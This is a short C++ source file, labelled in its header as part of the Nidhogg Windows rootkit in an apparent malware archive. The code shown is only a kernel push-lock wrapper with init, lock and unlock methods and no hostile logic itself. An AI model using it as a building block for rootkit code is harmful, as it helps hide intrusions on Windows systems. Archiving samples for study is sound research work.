/*
  name      Nidhogg
  type      rootkit
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "pch.h"
#include "PushLock.h"


void PushLock::Init() {
	ExInitializePushLock(&lock);
}

void PushLock::Lock() {
	ExAcquirePushLockExclusive(&lock);
}

void PushLock::Unlock() {
	ExReleasePushLockExclusiveEx(&lock, 0);
}